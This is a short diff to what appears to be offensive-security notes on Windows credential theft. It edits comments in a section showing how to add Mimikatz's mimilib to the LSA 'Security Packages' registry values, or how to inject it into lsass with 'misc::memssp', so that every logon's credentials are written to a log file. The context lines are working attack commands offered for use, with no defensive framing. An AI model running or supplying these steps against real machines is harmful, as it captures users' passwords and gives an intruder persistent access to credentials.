@@ -17,8 +17,8 @@ $packages += "mimilib"
 Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig" -Name 'Security Packages' -Value $packages
 Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa" -Name 'Security Packages' -Value $packages
 # Reboot
-# After reboot all logons are logged to C:\Windows\System32\kiwissp.log
+# After reboot all logons are logged to C:\Windows\System32\[kiwissp.log|mimilsa.log]
 
-# Mimikatz can be used directory to load mimilib in lsass
+# Mimikatz can be used to load mimilib in lsass
 misc::memssp
 ```
